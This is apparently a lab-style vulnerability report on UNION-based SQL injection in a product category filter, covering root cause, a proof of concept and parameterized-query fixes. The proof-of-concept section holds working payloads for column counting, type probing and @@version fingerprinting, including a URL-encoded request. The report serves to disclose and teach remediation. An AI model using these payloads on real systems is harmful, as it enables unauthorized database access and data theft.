# Vulnerability Report: SQL Injection UNION Attack Leading to Database Fingerprinting (MySQL & Microsoft SQL Server)

* **Vulnerability Type:** SQL Injection (CWE-89) / Information Disclosure (CWE-200)

* **Severity:** High

* **Target Component:** Category Filter (`/filter?category=`)

* **OWASP Top 10 Mapping:** A03:2021 – Injection

## 1. Executive Summary

An SQL Injection (SQLi) vulnerability was identified in the application's product category filtering functionality. By executing a UNION-based SQL injection attack, an unauthenticated attacker can combine arbitrary database query results with the native application response. This allows full database fingerprinting by extracting the target database engine type and version string (specifically targeting MySQL and Microsoft SQL Server implementations).

## 2. Technical Analysis & Root Cause

The application accepts user input via the `category` query parameter and directly concatenates it into a dynamic SQL query without proper parameterization or input sanitization.

### MySQL & MSSQL Syntax Nuances
1. **Comment Syntax (`-- `):** In both MySQL and Microsoft SQL Server, the double-dash comment sequence (`--`) requires a trailing whitespace character (or a trailing control character) to be recognized as a valid comment by the SQL parser.
2. **Global Variables (`@@version`):** Both MySQL and Microsoft SQL Server expose global environment variables via the `@@version` syntax to retrieve database version information.
3. **No Mandatory `FROM` Table:** Unlike Oracle databases, MySQL and Microsoft SQL Server do not require a `FROM` clause when selecting constant values or environment variables.

### Vulnerable Query Pattern
```sql
SELECT * FROM products WHERE category = '<USER_INPUT>' AND released = 1;
```

Because user input escapes the string context, an attacker can append a `UNION SELECT` statement to exfiltrate database state data.

## 3. Proof of Concept (PoC)

1. Intercept a legitimate product category filtering request using an HTTP proxy (e.g., Burp Suite):
   ```http
   GET /filter?category=Gifts HTTP/1.1
   Host: target-app.net
   ```

2. **Step 1: Determine Column Count**
   Inject the `ORDER BY` clause to determine the number of columns selected by the original query (note the trailing space or `+` in URL-encoded format after `--`):
   * `' ORDER BY 1-- ` $\rightarrow$ `200 OK`
   * `' ORDER BY 2-- ` $\rightarrow$ `200 OK`
   * `' ORDER BY 3-- ` $\rightarrow$ `500 Internal Server Error`

   *Result:* An error at column 3 confirms that the application query returns exactly **2 columns**.

3. **Step 2: Determine Column Data Types**
   Test column data type compatibility using string literal values:
   ```text
   ' UNION SELECT 'a','a'-- 
   ```
   *Result:* The application returns `200 OK`, confirming that both columns support string data.

4. **Step 3: Extract Database Version**
   Inject the system variable `@@version` to retrieve version details:
   ```text
   ' UNION SELECT @@version, NULL-- 
   ```
   Submit the formatted URL request:
   ```http
   GET /filter?category=%27%20UNION%20SELECT%20@@version,%20NULL--%20 HTTP/1.1
   Host: target-app.net
   ```

5. **Result:** The database version details (e.g., `8.0.28` for MySQL or `Microsoft SQL Server 2019...`) are returned directly in the HTTP response body and rendered on the product page.

## 4. Impact

* **System Fingerprinting:** Exposes exact software vendor, engine version, and build details.
* **Targeted Exploitation:** Allows an attacker to cross-reference known public CVEs specific to the identified engine and version.
* **Data Exfiltration:** Demonstrates that any table accessible to the database user context can be queried and exfiltrated via `UNION` statements.

## 5. Remediation & Developer Guidance

### Primary Fix: Parameterized Queries (Prepared Statements)
Enforce parameterized queries or prepared statements across all database interactions to ensure user inputs are treated exclusively as literal parameters rather than executable SQL syntax.

#### Secure Code Implementation Example (Python / MySQL Connector)
```python
# Secure implementation using parameterized queries
cursor.execute(
    "SELECT * FROM products WHERE category = %s AND released = 1",
    (user_input_category,)
)
```

#### Secure Code Implementation Example (C# / ASP.NET / MS SQL Server)
```csharp
// Secure implementation using SqlCommand and Parameters
string query = "SELECT * FROM products WHERE category = @category AND released = 1";
SqlCommand command = new SqlCommand(query, connection);
command.Parameters.AddWithValue("@category", userInputCategory);
SqlDataReader reader = command.ExecuteReader();
```

## 6. References

* **CWE-89:** [Improper Neutralization of Special Elements used in an SQL Command](https://cwe.mitre.org/data/definitions/89.html)
* **CWE-200:** [Exposure of Sensitive Information to an Unauthorized Actor](https://cwe.mitre.org/data/definitions/200.html)
* **OWASP:** [SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)